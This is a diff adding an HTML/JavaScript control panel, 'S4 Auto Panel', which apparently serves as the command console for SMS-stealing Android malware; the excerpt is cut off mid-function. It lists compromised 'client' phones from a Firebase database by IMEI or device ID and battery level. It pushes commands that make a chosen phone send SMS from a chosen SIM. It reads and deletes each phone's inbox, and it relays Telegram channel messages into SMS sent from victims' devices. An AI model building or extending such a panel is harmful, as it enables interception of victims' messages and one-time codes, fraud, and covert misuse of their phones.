@@ -1,0 +1,1167 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Firebase Realtime Connect</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg-1: #050816;
+      --bg-2: #111936;
+      --panel: rgba(255, 255, 255, 0.11);
+      --panel-strong: rgba(255, 255, 255, 0.16);
+      --border: rgba(255, 255, 255, 0.2);
+      --text: #f8fbff;
+      --muted: #aeb9d4;
+      --primary: #7c3aed;
+      --cyan: #06b6d4;
+      --green: #34d399;
+      --rose: #fb7185;
+      --shadow: 0 30px 90px rgba(0, 0, 0, 0.48);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #ffc22c;
+      color: var(--text);
+      overflow-x: hidden;
+    }
+
+    body::before,
+    body::after {
+      content: none;
+    }
+
+    body::before { top: -210px; right: -160px; }
+    body::after { left: -260px; bottom: -220px; animation-delay: -3s; }
+
+    @keyframes float {
+      0%, 100% { transform: translate3d(0, 0, 0) scale(1); }
+      50% { transform: translate3d(18px, -14px, 0) scale(1.04); }
+    }
+
+    .view {
+      min-height: 100vh;
+      width: min(1120px, 100%);
+      margin: 0 auto;
+      padding: 24px;
+      display: none;
+    }
+
+    .view.active { display: grid; }
+
+    .login-view {
+      place-items: center;
+      width: min(480px, 100%);
+    }
+
+    .glass-card {
+      border: 1px solid var(--border);
+      background: linear-gradient(145deg, var(--panel-strong), rgba(255, 255, 255, 0.07));
+      box-shadow: 0 18px 44px rgba(0, 0, 0, 0.32), 0 0 0 2px rgba(0, 0, 0, 0.08);
+      backdrop-filter: blur(24px);
+      -webkit-backdrop-filter: blur(24px);
+    }
+
+    .login-card {
+      width: 100%;
+      border-radius: 34px;
+      padding: 36px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 32px;
+    }
+
+    .brand-mark {
+      width: 52px;
+      height: 52px;
+      display: grid;
+      place-items: center;
+      border-radius: 17px;
+      background: linear-gradient(135deg, var(--primary), var(--cyan));
+      box-shadow: 0 18px 34px rgba(6, 182, 212, 0.28);
+      font-weight: 950;
+      letter-spacing: -0.04em;
+    }
+
+    .brand span,
+    .subtitle,
+    .note,
+    .muted { color: var(--muted); }
+
+    h1, h2, h3, p { margin-top: 0; }
+
+    .login-card h1 {
+      margin-bottom: 10px;
+      font-size: clamp(34px, 8vw, 48px);
+      line-height: 0.98;
+      letter-spacing: -0.06em;
+    }
+
+    .subtitle { margin-bottom: 30px; line-height: 1.65; }
+
+    label {
+      display: block;
+      margin-bottom: 10px;
+      font-size: 14px;
+      font-weight: 800;
+      color: #e0e7ff;
+    }
+
+    .input-wrap { position: relative; margin-bottom: 18px; }
+
+    input {
+      width: 100%;
+      border: 1px solid rgba(255, 255, 255, 0.18);
+      outline: none;
+      border-radius: 18px;
+      padding: 18px 18px 18px 50px;
+      color: var(--text);
+      background: rgba(4, 7, 20, 0.54);
+      font-size: 15px;
+      transition: border 0.2s, box-shadow 0.2s, transform 0.2s;
+    }
+
+    input:focus {
+      border-color: rgba(103, 232, 249, 0.76);
+      box-shadow: 0 0 0 4px rgba(6, 182, 212, 0.13);
+      transform: translateY(-1px);
+    }
+
+    .input-icon {
+      position: absolute;
+      left: 17px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #93c5fd;
+      font-size: 20px;
+    }
+
+    button, .card-button {
+      border: 0;
+      border-radius: 18px;
+      padding: 17px 20px;
+      color: #ffffff;
+      background: linear-gradient(135deg, var(--primary), var(--cyan));
+      font-size: 16px;
+      font-weight: 900;
+      cursor: pointer;
+      box-shadow: 0 18px 40px rgba(124, 58, 237, 0.34);
+      transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
+    }
+
+    .primary-button { width: 100%; }
+
+    button:hover:not(:disabled), .card-button:hover { transform: translateY(-2px); }
+    button:disabled { cursor: wait; opacity: 0.72; }
+
+    .ghost-button {
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.16);
+      box-shadow: none;
+    }
+
+    .status {
+      min-height: 50px;
+      margin-top: 18px;
+      padding: 14px 16px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+      border-radius: 16px;
+      font-size: 14px;
+      line-height: 1.5;
+      border: 1px solid transparent;
+    }
+
+    .status.show { display: flex; }
+    .status.success { color: #dcfce7; background: rgba(52, 211, 153, 0.13); border-color: rgba(52, 211, 153, 0.25); }
+    .status.error { color: #ffe4e6; background: rgba(251, 113, 133, 0.13); border-color: rgba(251, 113, 133, 0.25); }
+    .note { margin-top: 26px; font-size: 13px; line-height: 1.6; text-align: center; }
+
+    .app-view { align-content: start; gap: 22px; }
+
+    .topbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+      padding: 22px;
+      border-radius: 28px;
+    }
+
+    .topbar h1 {
+      margin: 0;
+      font-size: clamp(30px, 6vw, 54px);
+      letter-spacing: -0.06em;
+    }
+
+    .dashboard-grid, .clients-grid {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 18px;
+    }
+
+    .online-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .dashboard-card, .client-card, .detail-panel {
+      border-radius: 28px;
+      padding: 24px;
+    }
+
+    .dashboard-card {
+      min-height: 170px;
+      text-align: left;
+      background: linear-gradient(145deg, rgba(255, 255, 255, 0.16), rgba(255, 255, 255, 0.08));
+      border: 1px solid var(--border);
+      box-shadow: 0 16px 34px rgba(0, 0, 0, 0.34), 0 0 0 2px rgba(0, 0, 0, 0.08);
+    }
+
+    .dashboard-card strong {
+      display: block;
+      margin-bottom: 10px;
+      font-size: clamp(28px, 6vw, 44px);
+      letter-spacing: -0.05em;
+    }
+
+    .dashboard-card span, .client-card span { color: var(--muted); line-height: 1.55; }
+    .coming { opacity: 0.66; cursor: not-allowed; }
+
+    .screen-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 14px;
+      margin: 6px 0;
+    }
+
+    .screen-header h2 { margin: 0; font-size: clamp(26px, 6vw, 42px); letter-spacing: -0.05em; }
+
+    .clients-grid { grid-template-columns: repeat(auto-fit, minmax(230px, 1fr)); }
+
+    .client-card {
+      text-align: left;
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid var(--border);
+      box-shadow: 0 16px 34px rgba(0, 0, 0, 0.34), 0 0 0 2px rgba(0, 0, 0, 0.08);
+    }
+
+    .online-client-row {
+      width: 100%;
+      display: grid;
+      grid-template-columns: 1.4fr 1.2fr 0.8fr auto;
+      align-items: center;
+      gap: 14px;
+      text-align: left;
+      color: #111;
+      background: #fff;
+      border: 2px solid #111;
+      border-radius: 18px;
+      padding: 16px 18px;
+      box-shadow: 0 5px 0 rgba(0, 0, 0, 0.14), 0 10px 24px rgba(0, 0, 0, 0.22);
+    }
+
+    .online-client-row strong {
+      display: block;
+      color: #111;
+      font-size: 18px;
+      line-height: 1.2;
+    }
+
+    .online-client-row span {
+      display: block;
+      color: #555;
+      font-size: 13px;
+      font-weight: 800;
+      line-height: 1.35;
+      overflow-wrap: anywhere;
+    }
+
+    .client-card h3 { margin-bottom: 8px; font-size: 22px; }
+    .pill { display: inline-flex; margin-top: 16px; padding: 8px 12px; border-radius: 999px; color: #dcfce7; background: rgba(52, 211, 153, 0.14); }
+    .online-client-row .pill { margin-top: 0; color: #064e3b; background: #bbf7d0; border: 1px solid #111; justify-self: end; }
+
+    pre {
+      margin: 0;
+      white-space: pre-wrap;
+      word-break: break-word;
+      color: #dbeafe;
+      font: 14px/1.6 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+    }
+
+    .sms-panel {
+      display: grid;
+      gap: 18px;
+      border-radius: 28px;
+      padding: 24px;
+    }
+
+    .sms-panel h3 {
+      margin-bottom: 0;
+      font-size: clamp(24px, 5vw, 36px);
+      letter-spacing: -0.05em;
+    }
+
+    .sms-panel textarea {
+      width: 100%;
+      min-height: 130px;
+      resize: vertical;
+      border: 1px solid rgba(255, 255, 255, 0.18);
+      outline: none;
+      border-radius: 18px;
+      padding: 18px;
+      color: var(--text);
+      background: rgba(4, 7, 20, 0.54);
+      font: inherit;
+      transition: border 0.2s, box-shadow 0.2s, transform 0.2s;
+    }
+
+    .sms-panel textarea:focus {
+      border-color: rgba(103, 232, 249, 0.76);
+      box-shadow: 0 0 0 4px rgba(6, 182, 212, 0.13);
+      transform: translateY(-1px);
+    }
+
+    .messages-view {
+      width: 100%;
+      max-width: none;
+      background: #ffc22c;
+      padding: 16px 31px;
+    }
+
+    .messages-view .screen-header {
+      width: min(1128px, 100%);
+      margin: 0 auto 10px;
+      color: #111;
+    }
+
+    .messages-view .clients-grid {
+      width: min(1158px, 100%);
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .sms-message-card {
+      position: relative;
+      width: 100%;
+      min-height: 136px;
+      padding: 16px 82px 16px 24px;
+      border: 2px solid #111;
+      border-radius: 12px;
+      background: #fff;
+      color: #050505;
+      box-shadow: 0 5px 0 rgba(0, 0, 0, 0.14), 0 10px 24px rgba(0, 0, 0, 0.24);
+      overflow: hidden;
+    }
+
+    .sms-message-card.highlight .message-body { color: #00b800; }
+
+    .message-body {
+      max-width: 940px;
+      margin: 0 0 34px;
+      color: #050505;
+      font-size: 18px;
+      font-weight: 850;
+      line-height: 1.22;
+      white-space: pre-wrap;
+      word-break: break-word;
+      overflow-wrap: anywhere;
+    }
+
+    .message-meta {
+      position: absolute;
+      left: 24px;
+      right: 82px;
+      bottom: 16px;
+      color: #626262;
+      font-size: 15px;
+      font-weight: 850;
+      line-height: 1.25;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .message-actions {
+      position: absolute;
+      top: 16px;
+      right: 22px;
+      display: grid;
+      gap: 14px;
+      justify-items: center;
+    }
+
+    .icon-button {
+      width: 38px;
+      height: 38px;
+      padding: 0;
+      border: 0;
+      border-radius: 0;
+      background: transparent;
+      box-shadow: none;
+      color: #000;
+      display: grid;
+      place-items: center;
+    }
+
+    .icon-button svg { width: 44px; height: 44px; fill: #000; stroke: #000; }
+
+    .telegram-toast {
+      position: fixed;
+      top: 18px;
+      left: 50%;
+      z-index: 50;
+      transform: translate(-50%, -140%);
+      padding: 16px 24px;
+      border: 2px solid #111;
+      border-radius: 999px;
+      background: #fff;
+      color: #111;
+      font-size: 18px;
+      font-weight: 900;
+      box-shadow: 0 12px 28px rgba(0, 0, 0, 0.25);
+      transition: transform 0.24s ease;
+    }
+
+    .telegram-toast.show { transform: translate(-50%, 0); }
+
+    @media (max-width: 720px) {
+      .messages-view { padding: 10px; }
+      .sms-message-card { min-height: 132px; padding: 14px 70px 38px 18px; }
+      .message-body { font-size: 17px; margin-bottom: 30px; }
+      .message-meta { left: 18px; right: 18px; bottom: 14px; font-size: 13px; }
+      .message-actions { right: 16px; top: 14px; gap: 12px; }
+      .icon-button, .icon-button svg { width: 34px; height: 34px; }
+    }
+
+    @media (max-width: 720px) {
+      .view { padding: 14px; }
+      .login-card, .topbar, .dashboard-card, .client-card, .detail-panel { border-radius: 24px; padding: 22px; }
+      .topbar, .screen-header { align-items: stretch; flex-direction: column; }
+      .dashboard-grid { grid-template-columns: 1fr; }
+      .online-client-row { grid-template-columns: 1fr; }
+      .online-client-row .pill { justify-self: start; }
+    }
+  </style>
+</head>
+<body>
+  <div id="telegramToast" class="telegram-toast" role="status" aria-live="polite">New massage detect in channel</div>
+  <main id="loginView" class="view login-view active" aria-label="Firebase login screen">
+    <section class="login-card glass-card" aria-labelledby="connect-title">
+      <div class="brand">
+        <div class="brand-mark">S4</div>
+        <div>
+          <strong>S4 Auto Panel</strong><br />
+          <span>Firebase Realtime connector</span>
+        </div>
+      </div>
+
+      <h1 id="connect-title">Connect Firebase</h1>
+      <p class="subtitle">Apna Firebase Realtime Database URL paste karo. API key ki zaroorat nahi hai.</p>
+
+      <form id="connectForm">
+        <label for="firebaseUrl">Enter Firebase URL</label>
+        <div class="input-wrap">
+          <span class="input-icon">⌁</span>
+          <input id="firebaseUrl" name="firebaseUrl" type="url" placeholder="https://your-project-default-rtdb.firebaseio.com" autocomplete="url" required />
+        </div>
+        <button id="connectButton" class="primary-button" type="submit">Connect</button>
+      </form>
+
+      <div id="status" class="status" role="status" aria-live="polite"></div>
+      <p class="note">Tip: Firebase Realtime Database URL use karein, Firestore ya Hosting URL nahi.</p>
+    </section>
+  </main>
+
+  <main id="homeView" class="view app-view" aria-label="S4 Auto Panel home screen">
+    <header class="topbar glass-card">
+      <div>
+        <h1>S4 AUTO PANEL</h1>
+        <p id="connectedUrl" class="muted"></p>
+      </div>
+      <button id="logoutButton" class="ghost-button" type="button">Change Firebase</button>
+    </header>
+
+    <section class="dashboard-grid" aria-label="Panel cards">
+      <button id="onlineCard" class="dashboard-card card-button" type="button">
+        <strong>ONLINE</strong>
+        <span>Firebase me jinke status/stutas true hai un clients ko dekhein.</span>
+      </button>
+      <button id="checkedCard" class="dashboard-card card-button coming" type="button" disabled>
+        <strong>CHACKED</strong>
+        <span>Coming soon — ye feature future me add hoga.</span>
+      </button>
+      <button id="telegramCard" class="dashboard-card card-button" type="button">
+        <strong>TELEGRAM</strong>
+        <span>Channel set karein; mirrored channel massage parse karke connected client se SMS send hoga.</span>
+      </button>
+    </section>
+  </main>
+
+  <main id="telegramView" class="view app-view" aria-label="Telegram channel setup screen">
+    <div class="screen-header">
+      <div>
+        <h2>TELEGRAM CHANNEL</h2>
+        <p class="muted">Channel username set karein. Messages ko Firebase path <code>telegramChannels/&lt;channel&gt;/messages</code> me mirror karna hoga.</p>
+      </div>
+      <button id="backTelegramHomeButton" class="ghost-button" type="button">Back Home</button>
+    </div>
+    <section class="sms-panel glass-card">
+      <form id="telegramForm">
+        <label for="telegramChannel">Telegram Channel</label>
+        <div class="input-wrap">
+          <span class="input-icon">✦</span>
+          <input id="telegramChannel" name="telegramChannel" type="text" placeholder="@channel_username" required />
+        </div>
+        <button class="primary-button" type="submit">Set Telegram Channel</button>
+      </form>
+      <div id="telegramStatus" class="status" role="status" aria-live="polite"></div>
+    </section>
+  </main>
+
+  <main id="onlineView" class="view app-view" aria-label="Online clients screen">
+    <div class="screen-header">
+      <div>
+        <h2>ONLINE CLIENTS</h2>
+        <p class="muted">Har online client ka separate card yahan show hoga.</p>
+      </div>
+      <button id="backHomeButton" class="ghost-button" type="button">Back Home</button>
+    </div>
+    <div id="onlineStatus" class="status" role="status" aria-live="polite"></div>
+    <section id="clientsGrid" class="clients-grid"></section>
+  </main>
+
+  <main id="deviceView" class="view app-view" aria-label="Connected device screen">
+    <div class="screen-header">
+      <div>
+        <h2>S4 AUTO SYSTEM</h2>
+        <p id="connectedDevice" class="muted">connected device -</p>
+      </div>
+      <button id="backClientsButton" class="ghost-button" type="button">Back Clients</button>
+    </div>
+
+    <section class="sms-panel glass-card" aria-labelledby="sms-title">
+      <div>
+        <h3 id="sms-title">Send SMS</h3>
+        <p class="muted">Connected device ke through target number par massage send karein.</p>
+      </div>
+      <form id="smsForm">
+        <label for="targetNumber">Target Number</label>
+        <div class="input-wrap">
+          <span class="input-icon">☎</span>
+          <input id="targetNumber" name="targetNumber" type="tel" placeholder="+919876543210" required />
+        </div>
+
+        <label for="simIndex">SIM Slot</label>
+        <div class="input-wrap">
+          <span class="input-icon">☷</span>
+          <input id="simIndex" name="simIndex" type="number" min="0" max="2" value="0" required />
+        </div>
+
+        <label for="smsMessage">Massage</label>
+        <textarea id="smsMessage" name="smsMessage" placeholder="Type massage here..." required></textarea>
+
+        <button id="sendSmsButton" class="primary-button" type="submit">Send Massage</button>
+      </form>
+      <div id="smsStatus" class="status" role="status" aria-live="polite"></div>
+      <button id="showMessagesButton" class="ghost-button" type="button">Show Device Massages</button>
+    </section>
+  </main>
+
+  <main id="messagesView" class="view app-view messages-view" aria-label="Connected device massages screen">
+    <div class="screen-header">
+      <div>
+        <h2>DEVICE MASSAGES</h2>
+        <p id="messagesDevice" class="muted">connected device -</p>
+      </div>
+      <button id="backDeviceButton" class="ghost-button" type="button">Back Device</button>
+    </div>
+    <div id="messagesStatus" class="status" role="status" aria-live="polite"></div>
+    <section id="messagesGrid" class="clients-grid"></section>
+  </main>
+
+  <script>
+    const views = {
+      login: document.querySelector('#loginView'),
+      home: document.querySelector('#homeView'),
+      telegram: document.querySelector('#telegramView'),
+      online: document.querySelector('#onlineView'),
+      device: document.querySelector('#deviceView'),
+      messages: document.querySelector('#messagesView'),
+    };
+
+    const form = document.querySelector('#connectForm');
+    const input = document.querySelector('#firebaseUrl');
+    const button = document.querySelector('#connectButton');
+    const statusBox = document.querySelector('#status');
+    const connectedUrl = document.querySelector('#connectedUrl');
+    const onlineStatus = document.querySelector('#onlineStatus');
+    const clientsGrid = document.querySelector('#clientsGrid');
+    const connectedDevice = document.querySelector('#connectedDevice');
+    const smsForm = document.querySelector('#smsForm');
+    const targetNumber = document.querySelector('#targetNumber');
+    const simIndex = document.querySelector('#simIndex');
+    const smsMessage = document.querySelector('#smsMessage');
+    const sendSmsButton = document.querySelector('#sendSmsButton');
+    const smsStatus = document.querySelector('#smsStatus');
+    const showMessagesButton = document.querySelector('#showMessagesButton');
+    const messagesDevice = document.querySelector('#messagesDevice');
+    const messagesStatus = document.querySelector('#messagesStatus');
+    const messagesGrid = document.querySelector('#messagesGrid');
+    const telegramForm = document.querySelector('#telegramForm');
+    const telegramChannel = document.querySelector('#telegramChannel');
+    const telegramStatus = document.querySelector('#telegramStatus');
+    const telegramToast = document.querySelector('#telegramToast');
+
+    let firebaseDatabaseUrl = localStorage.getItem('firebaseDatabaseUrl') || '';
+    let onlineClients = [];
+    let connectedClient = null;
+    let processedTelegramMessages = new Set(JSON.parse(localStorage.getItem('processedTelegramMessages') || '[]'));
+    let telegramPollTimer = null;
+    let messagesRefreshTimer = null;
+    let isMessagesRefreshRunning = false;
+    let shouldRefreshMessagesAgain = false;
+
+    const showView = (name) => {
+      Object.values(views).forEach((view) => view.classList.remove('active'));
+      views[name].classList.add('active');
+
+      if (name !== 'messages' && messagesRefreshTimer) {
+        clearInterval(messagesRefreshTimer);
+        messagesRefreshTimer = null;
+      }
+
+      if (name === 'messages' && !messagesRefreshTimer) {
+        renderMessages(true);
+        messagesRefreshTimer = setInterval(() => renderMessages(true), 500);
+      }
+    };
+
+    const showStatus = (box, message, type) => {
+      box.textContent = message;
+      box.className = `status show ${type}`;
+    };
+
+    const hideStatus = (box) => {
+      box.textContent = '';
+      box.className = 'status';
+    };
+
+    const normalizeFirebaseUrl = (rawUrl) => {
+      const parsedUrl = new URL(rawUrl.trim());
+      parsedUrl.pathname = parsedUrl.pathname.replace(/\/$/, '');
+      parsedUrl.search = '';
+      parsedUrl.hash = '';
+      return parsedUrl.toString().replace(/\/$/, '');
+    };
+
+    const isRealtimeDatabaseUrl = (url) => {
+      return /firebaseio\.com$|firebasedatabase\.app$/i.test(new URL(url).hostname);
+    };
+
+    const isObject = (value) => value !== null && typeof value === 'object' && !Array.isArray(value);
+
+    const hasTrueStatus = (value) => {
+      if (!isObject(value)) return false;
+      return value.status === true || value.stutas === true;
+    };
+
+    const hasTrueStatusDeep = (value) => {
+      if (!isObject(value)) return false;
+      if (hasTrueStatus(value)) return true;
+      return Object.values(value).some(hasTrueStatusDeep);
+    };
+
+    const findOnlineClients = (node, path = '') => {
+      if (!isObject(node)) return [];
+
+      return Object.entries(node).flatMap(([key, value]) => {
+        const nextPath = path ? `${path}/${key}` : key;
+        const parts = nextPath.split('/');
+
+        if (parts[0] === 'clients' && parts.length === 2 && hasTrueStatusDeep(value)) {
+          return [{ id: key, path: nextPath, data: value }];
+        }
+
+        if (hasTrueStatus(value)) {
+          return [{ id: key, path: nextPath, data: value }];
+        }
+
+        return findOnlineClients(value, nextPath);
+      });
+    };
+
+    const deepFindValue = (value, keys) => {
+      if (!isObject(value)) return undefined;
+      for (const key of keys) {
+        if (value[key] !== undefined && value[key] !== null && value[key] !== '') return value[key];
+      }
+      for (const child of Object.values(value)) {
+        const found = deepFindValue(child, keys);
+        if (found !== undefined && found !== null && found !== '') return found;
+      }
+      return undefined;
+    };
+
+    const getDeviceId = (client) => {
+      return deepFindValue(client.data, ['deviceId', 'deviceID', 'device_id', 'androidId', 'android_id', 'imei', 'id']) || client.id;
+    };
+
+    const getDeviceName = (client) => {
+      return deepFindValue(client.data, ['deviceName', 'device_name', 'name', 'model', 'brand', 'manufacturer', 'mobileName', 'mobile_name']) || 'Unknown Device';
+    };
+
+    const getBattery = (client) => {
+      const value = deepFindValue(client.data, ['battery', 'batteryLevel', 'battery_level', 'batteryPercent', 'battery_percent', 'batteryPercentage']);
+      if (value === undefined || value === null || value === '') return 'N/A';
+      return String(value).includes('%') ? String(value) : `${value}%`;
+    };
+
+    const getClientId = (client) => {
+      const parts = client.path.split('/');
+      if (parts[0] === 'clients' && parts[1]) return parts[1];
+      return client.data.clientId || client.data.clientID || client.data.id || client.id;
+    };
+
+    const firebasePath = (path) => {
+      return path.split('/').map(encodeURIComponent).join('/');
+    };
+
+    const safeKey = (value) => {
+      return String(value).replace(/[.#$/\[\]]/g, '_');
+    };
+
+    const refreshConnectedUrl = () => {
+      connectedUrl.textContent = firebaseDatabaseUrl ? `Connected: ${firebaseDatabaseUrl}` : '';
+    };
+
+    const renderHome = () => {
+      refreshConnectedUrl();
+      showView('home');
+    };
+
+    const fetchDatabaseRoot = async () => {
+      const response = await fetch(`${firebaseDatabaseUrl}/.json`, { method: 'GET' });
+
+      if (!response.ok) {
+        throw new Error(`Firebase data read failed. Status: ${response.status}`);
+      }
+
+      return response.json();
+    };
+
+    const renderOnlineClients = async () => {
+      showView('online');
+      clientsGrid.innerHTML = '';
+      clientsGrid.classList.remove('online-list');
+      showStatus(onlineStatus, 'Loading online clients...', 'success');
+
+      try {
+        const data = await fetchDatabaseRoot();
+        onlineClients = findOnlineClients(data);
+
+        if (onlineClients.length === 0) {
+          showStatus(onlineStatus, 'Abhi koi status/stutas true client nahi mila.', 'error');
+          return;
+        }
+
+        hideStatus(onlineStatus);
+        clientsGrid.classList.add('online-list');
+        onlineClients.forEach((client, index) => {
+          const row = document.createElement('button');
+          row.className = 'online-client-row';
+          row.type = 'button';
+          row.dataset.index = String(index);
+
+          const makeCell = (value, label) => {
+            const cell = document.createElement('div');
+            const strong = document.createElement('strong');
+            strong.textContent = value;
+            const caption = document.createElement('span');
+            caption.textContent = label;
+            cell.append(strong, caption);
+            return cell;
+          };
+
+          const device = makeCell(getDeviceId(client), 'Device ID');
+          const name = makeCell(getDeviceName(client), 'Device Name');
+          const battery = makeCell(getBattery(client), 'Battery');
+
+          const pill = document.createElement('div');
+          pill.className = 'pill';
+          pill.textContent = 'ONLINE';
+
+          row.append(device, name, battery, pill);
+          clientsGrid.append(row);
+        });
+      } catch (error) {
+        showStatus(onlineStatus, error.message || 'Online clients load nahi ho paaye.', 'error');
+      }
+    };
+
+    const connectDevice = (client) => {
+      connectedClient = client;
+      connectedDevice.textContent = `connected device - ${getDeviceId(client)}`;
+      hideStatus(smsStatus);
+      smsForm.reset();
+      startTelegramPolling();
+      showView('device');
+    };
+
+    const sendMassageToConnectedDevice = async (number, message, selectedSimIndex) => {
+      if (!connectedClient) {
+        throw new Error('Pehle online screen se device connect karein.');
+      }
+
+      const clientId = safeKey(getClientId(connectedClient));
+      const smsData = {
+        from: Number(selectedSimIndex),
+        isSended: false,
+        message,
+        to: number,
+      };
+
+      const writeSmsPath = async (path) => {
+        return fetch(`${firebaseDatabaseUrl}/${path}.json`, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(smsData),
+        });
+      };
+
+      const primaryPath = `clients/${clientId}/webhookEvent/sendSms`;
+      const fallbackPath = `clients/${clientId}/sendSms`;
+      const primaryResponse = await writeSmsPath(primaryPath);
+
+      if (primaryResponse.ok) {
+        return primaryResponse.json();
+      }
+
+      const fallbackResponse = await writeSmsPath(fallbackPath);
+
+      if (fallbackResponse.ok) {
+        return fallbackResponse.json();
+      }
+
+      throw new Error(`Massage command Firebase me save nahi hua. Primary status: ${primaryResponse.status}, fallback status: ${fallbackResponse.status}`);
+    };
+
+    const looksLikeMessage = (value) => {
+      if (!isObject(value)) return false;
+      return ['message', 'massage', 'body', 'text', 'content', 'sms', 'to', 'targetNumber', 'sender', 'address', 'timestamp', 'date'].some((key) => key in value);
+    };
+
+    const collectMessages = (node, basePath) => {
+      if (node === null || node === undefined) return [];
+      if (!isObject(node)) return [{ id: basePath.split('/').pop(), path: basePath, data: { message: String(node) } }];
+
+      if (looksLikeMessage(node)) {
+        return [{ id: basePath.split('/').pop(), path: basePath, data: node }];
+      }
+
+      return Object.entries(node).flatMap(([id, value]) => collectMessages(value, `${basePath}/${id}`));
+    };
+
+    const readMessageBody = (data) => {
+      if (!isObject(data)) return String(data || '');
+      return data.message || data.massage || data.body || data.text || data.content || data.sms || '';
+    };
+
+    const readSender = (data) => {
+      if (!isObject(data)) return 'UNKNOWN';
+      return data.sender || data.senderName || data.fromNumber || data.from || data.phone || data.address || 'UNKNOWN';
+    };
+
+    const readDate = (data) => {
+      if (!isObject(data)) return '';
+      if (data.date) return data.date;
+      if (data.createdAt) return typeof data.createdAt === 'number' ? new Date(data.createdAt).toLocaleString('en-IN') : data.createdAt;
+      if (data.timestamp) return new Date(Number(data.timestamp) || Date.parse(data.timestamp)).toLocaleString('en-IN');
+      if (data.time) return typeof data.time === 'number' ? new Date(data.time).toLocaleString('en-IN') : data.time;
+      return '';
+    };
+
+    const getClientBasePaths = (client) => {
+      const exactPath = firebasePath(client.path);
+      const parts = client.path.split('/');
+      const paths = new Set([exactPath]);
+
+      if (parts[0] === 'clients' && parts[1]) {
+        paths.add(`clients/${safeKey(parts[1])}`);
+      }
+
+      return [...paths];
+    };
+
+    const copyIcon = '<svg viewBox="0 0 64 64" aria-hidden="true"><path d="M17 8h28v6H23v30h-6z"></path><path d="M27 18h27v38H27zm6 6v26h15V24z"></path></svg>';
+    const trashIcon = '<svg viewBox="0 0 64 64" aria-hidden="true"><path d="M22 18h20l-2-5H24z"></path><path d="M17 22h30v5H17z"></path><path d="M20 29h24l-2 27H22z"></path></svg>';
+
+    const renderMessages = async (isAutoRefresh = false) => {
+      if (isMessagesRefreshRunning) {
+        shouldRefreshMessagesAgain = true;
+        return;
+      }
+
+      if (!connectedClient) {
+        showView('online');
+        return;
+      }
+
+      isMessagesRefreshRunning = true;
+      if (!isAutoRefresh) showView('messages');
+      messagesDevice.textContent = `connected device - ${getDeviceId(connectedClient)}`;
+      if (!isAutoRefresh) {
+        messagesGrid.innerHTML = '';
+        showStatus(messagesStatus, 'Loading device massages...', 'success');
+      }
+
+      try {
+        const clientBasePaths = getClientBasePaths(connectedClient);
+        const childMessageNodes = ['webhookEvent/sendSms', 'sendSms', 'massages', 'messages', 'smsCommands', 'sentMessages', 'receivedMessages', 'inbox', 'sms'];
+        const paths = clientBasePaths.flatMap((basePath) => childMessageNodes.map((childPath) => `${basePath}/${childPath}`));
+
+        const results = await Promise.all(paths.map(async (path) => {
+          const response = await fetch(`${firebaseDatabaseUrl}/${path}.json`);
+          if (!response.ok) return [];
+          const data = await response.json();
+          return collectMessages(data, path);
+        }));
+
+        const uniqueMassages = new Map();
+        results.flat().forEach((massage) => uniqueMassages.set(massage.path, massage));
+        const massages = [...uniqueMassages.values()].sort((a, b) => {
+          const timeDiff = getMessageTime(b) - getMessageTime(a);
+          if (timeDiff !== 0) return timeDiff;
+          return String(b.path).localeCompare(String(a.path));
+        });
+
+        if (massages.length === 0) {
+          showStatus(messagesStatus, 'Is connected device ke massages abhi Firebase me nahi mile.', 'error');
+          return;
+        }
+
+        hideStatus(messagesStatus);
+        messagesGrid.innerHTML = '';
+        massages.forEach((massage, index) => {
+          const data = massage.data || {};
+          const body = readMessageBody(data) || JSON.stringify(data, null, 2);
+          const card = document.createElement('article');
+          card.className = `sms-message-card ${index % 3 === 0 ? 'highlight' : ''}`;
+
+          const messageBody = document.createElement('div');
+          messageBody.className = 'message-body';
+          messageBody.textContent = body;
+
+          const meta = document.createElement('div');
+          meta.className = 'message-meta';
+          meta.textContent = `Sender: ${readSender(data)} | Date: ${readDate(data)} | Type: ${data.type || 'incoming'}`;
+
+          const actions = document.createElement('div');
+          actions.className = 'message-actions';
+          const copyButton = document.createElement('button');
+          copyButton.className = 'icon-button';
+          copyButton.type = 'button';
+          copyButton.innerHTML = copyIcon;
+          copyButton.addEventListener('click', () => navigator.clipboard?.writeText(body));
+          const deleteButton = document.createElement('button');
+          deleteButton.className = 'icon-button';
+          deleteButton.type = 'button';
+          deleteButton.innerHTML = trashIcon;
+          deleteButton.addEventListener('click', async () => {
+            await fetch(`${firebaseDatabaseUrl}/${massage.path}.json`, { method: 'DELETE' });
+            renderMessages();
+          });
+          actions.append(copyButton, deleteButton);
+          card.append(messageBody, meta, actions);
+          messagesGrid.append(card);
+        });
+      } catch (error) {
+        showStatus(messagesStatus, error.message || 'Device massages load nahi ho paaye.', 'error');
+      } finally {
+        isMessagesRefreshRunning = false;
+        if (shouldRefreshMessagesAgain && views.messages.classList.contains('active')) {
+          shouldRefreshMessagesAgain = false;
+          renderMessages(true);
+        }
+      }
+    };
+
+    const normalizePhoneNumber = (value) => {
+      const cleaned = String(value || '').replace(/[\s-]/g, '');
+      if (/^\d{10}$/.test(cleaned)) return `+91${cleaned}`;
